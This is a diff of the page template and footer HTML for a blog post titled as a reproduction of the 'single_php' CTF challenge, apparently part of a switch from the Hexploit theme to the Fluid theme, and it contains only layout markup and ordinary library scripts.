+      <div>0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现</div>
+      <div>https://eznp.github.io/2025/01/20/0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/19/%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E8%BD%A6%E5%8E%A2%E5%A4%8D%E7%8E%B0/" title="不存在的车厢复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">不存在的车厢复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/15/ciscn-ccb%E9%83%A8%E5%88%86WP/" title="ciscn-ccb部分WP">
+                        <span class="hidden-mobile">ciscn-ccb部分WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
 
-    <!-- 返回主页链接 -->
-    <div class="text-center my-8">
-        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
     </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js"></script>
-<script>Prism.highlightAll();</script>
-
+  </div>
+</div>
 
 
-<footer class="bg-black text-gray-400 py-4">
-    <div class="container mx-auto text-center">
-      <p>© <span id="current-year"></span>  Zer0 
-        <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
   </footer>
+
+  <!-- Scripts -->
   
-  <script> 
-    document.getElementById("current-year").textContent = new Date().getFullYear();
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
   </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
-</body>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
 </html>
